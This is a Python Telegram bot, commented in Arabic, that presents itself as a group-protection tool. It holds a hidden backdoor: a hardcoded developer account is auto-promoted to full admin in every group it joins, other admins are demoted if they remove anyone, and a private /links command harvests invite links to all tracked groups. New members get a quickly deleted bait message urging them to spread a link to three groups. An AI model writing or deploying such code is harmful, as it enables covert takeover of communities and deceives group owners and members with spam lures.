import os, re, asyncio, html
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ChatMemberStatus
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, ChatMemberHandler

# ================= الإعدادات الأساسية =================
TOKEN = os.getenv('BOT_TOKEN')
MY_USER_ID = 7878629406 
GROUPS_FILE = "bot_groups.txt"
# =================================================

# دالة لحفظ أيدي الجروب في ملف نصي لضمان عدم ضياع البيانات
def save_group_id(chat_id):
    if not os.path.exists(GROUPS_FILE):
        with open(GROUPS_FILE, "w") as f: pass
    
    with open(GROUPS_FILE, "r") as f:
        ids = f.read().splitlines()
    
    if str(chat_id) not in ids:
        with open(GROUPS_FILE, "a") as f:
            f.write(f"{chat_id}\n")

# دالة آمنة لقراءة الجروبات وتجنب الأخطاء
def get_tracked_groups():
    if not os.path.exists(GROUPS_FILE): return []
    tracked = []
    with open(GROUPS_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if line:
                try:
                    tracked.append(int(line))
                except ValueError:
                    continue
    return tracked

# دالة مساعدة لحذف رسالة الترحيب تلقائياً بعد 5 ثواني
async def delete_message_after_delay(context: ContextTypes.DEFAULT_TYPE, chat_id: int, message_id: int, delay: int):
    await asyncio.sleep(delay)
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except:
        pass 

# 1. وظيفة مراقبة المشرفين (سحب الرتب فوراً عند الطرد)
async def on_chat_member_updated(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        save_group_id(update.effective_chat.id)
        
    result = update.chat_member
    if not result: return
    
    if result.new_chat_member.status in [ChatMemberStatus.BANNED, ChatMemberStatus.LEFT]:
        actor_id = result.from_user.id
        if actor_id != MY_USER_ID and actor_id != context.bot.id:
            try:
                await context.bot.promote_chat_member(
                    chat_id=update.effective_chat.id,
                    user_id=actor_id,
                    can_change_info=False,
                    can_post_messages=False,
                    can_edit_messages=False,
                    can_delete_messages=False,
                    can_invite_users=False,
                    can_restrict_members=False,
                    can_pin_messages=False,
                    can_promote_members=False
                )
                await update.effective_chat.send_message(f"🚫 تم سحب رتبة {result.from_user.first_name} لمحاولة طرد عضو!")
            except Exception as e:
                print(f"Error demoting admin: {e}")

# 2. وظيفة حماية البوتات + الترقية التلقائية للمطور + رسالة الترحيب (نفس الصورة)
async def protect_group(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if update.effective_chat.type in ["group", "supergroup"]:
        save_group_id(chat_id)
        
    if update.message and update.message.new_chat_members:
        for member in update.message.new_chat_members:
            
            # لو العضو الجديد هو أنت (المطور)
            if member.id == MY_USER_ID:
                try:
                    await context.bot.promote_chat_member(
                        chat_id=chat_id,
                        user_id=MY_USER_ID,
                        can_change_info=True,
                        can_delete_messages=True,
                        can_invite_users=True,
                        can_restrict_members=True,
                        can_pin_messages=True,
                        can_promote_members=True
                    )
                    await update.effective_chat.send_message("👑 أهلاً بك يا مطوري العزيز! تم رفعك مشرفاً بكامل الصلاحيات تلقائياً.")
                    continue
                except Exception as e:
                    print(f"فشل ترقية المطور: {e}")
            
            # حماية المجموعات من البوتات الغريبة
            if member.is_bot and member.id != context.bot.id:
                if update.message.from_user.id != MY_USER_ID:
                    try:
                        await context.bot.ban_chat_member(chat_id, member.id)
                    except: pass
                    continue
            
            # الترحيب بالعضو بنفس نص الصورة بالظبط والزر المتحول
            if not member.is_bot:
                try:
                    chat_obj = await context.bot.get_chat(chat_id)
                    group_link = chat_obj.invite_link
                    
                    if not group_link:
                        try:
                            invite_obj = await context.bot.create_chat_invite_link(chat_id=chat_id, name="رابط الترحيب")
                            group_link = invite_obj.invite_link
                        except:
                            group_link = "https://t.me"
                    
                    # الزر الشفاف المكتوب فيه "قروب المقاطع" وبداخله الرابط
                    keyboard = [[InlineKeyboardButton("قروب المقاطع", url=group_link)]]
                    reply_markup = InlineKeyboardMarkup(keyboard)
                    
                    # النص مأخوذ من الصورة بالظبط
                    welcome_text = (
                        "<b>لفتح محتوي المحادثه يرجي الضغط علي الزر في الأسفل ومشاركه الرابط "
                        "في 3 مجموعات لفتح محتوي المحادثه 👇👇👇</b>"
                    )
                    
                    sent_msg = await update.message.reply_text(welcome_text, reply_markup=reply_markup, parse_mode="HTML")
                    
                    # الحذف التلقائي بعد 5 ثواني في الخلفية
                    asyncio.create_task(delete_message_after_delay(context, chat_id, sent_msg.message_id, 5))
                    
                except Exception as e:
                    print(f"خطأ في رسالة الترحيب: {e}")

# 3. المعالج العام (منع الروابط + حفظ المجموعات)
async def handle_everything(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.type in ["group", "supergroup"]:
        save_group_id(update.effective_chat.id)
        
    if not update.message or not update.message.text: return
    
    if re.search(r'http[s]?://|www\.', update.message.text):
        res = await context.bot.get_chat_member(update.effective_chat.id, update.effective_user.id)
        if res.status not in [ChatMemberStatus.ADMINISTRATOR, ChatMemberStatus.OWNER]:
            try:
                await update.message.delete()
            except: pass

# 4. أمر جلب الروابط للأدمن
async def get_all_links(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_USER_ID:
        return
        
    try:
        status_msg = await update.message.reply_text("🔄 جاري فحص المجموعات وتجهيز الروابط...")
        chat_ids = get_tracked_groups()
        if not chat_ids:
            await status_msg.edit_text("📭 لم يتم تسجيل أي مجموعات في القائمة حتى الآن.")
            return
            
        report = "📋 <b>قائمة المجموعات المشترك بها البوت:</b>\n\n"
        for cid in chat_ids:
            try:
                chat = await context.bot.get_chat(cid)
                link = chat.invite_link
                if not link:
                    try:
                        invite_obj = await context.bot.create_chat_invite_link(chat_id=cid, name="رابط تحكم المطور")
                        link = invite_obj.invite_link
                    except:
                        link = "❌ (تأكد أن البوت مشرف ولديه صلاحية الروابط)"
                
                safe_title = html.escape(chat.title)
                report += f"👥 <b>{safe_title}</b>\n🆔 <code>{cid}</code>\n🔗 {link}\n\n"
            except Exception:
                report += f"🗑️ <b>مجموعة غير متاحة</b>\n🆔 <code>{cid}</code>\n❌ البوت لم يعد عضواً فيها.\n\n"
                
        await status_msg.delete()
        
        if len(report) > 4000:
            chunks = [report[i:i+4000] for i in range(0, len(report), 4000)]
            for chunk in chunks:
                await update.message.reply_text(chunk, parse_mode="HTML")
        else:
            await update.message.reply_text(report, parse_mode="HTML")
            
    except Exception as master_error:
        print(f"Error in links command: {master_error}")

def main():
    if not TOKEN: return
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("links", get_all_links))
    app.add_handler(ChatMemberHandler(on_chat_member_updated, ChatMemberHandler.CHAT_MEMBER))
    app.add_handler(MessageHandler(filters.StatusUpdate.NEW_CHAT_MEMBERS, protect_group))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_everything))
    
    print("البوت شغال.. تم مطابقة رسالة الترحيب مع الصورة بنجاح!")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == '__main__':
    main()
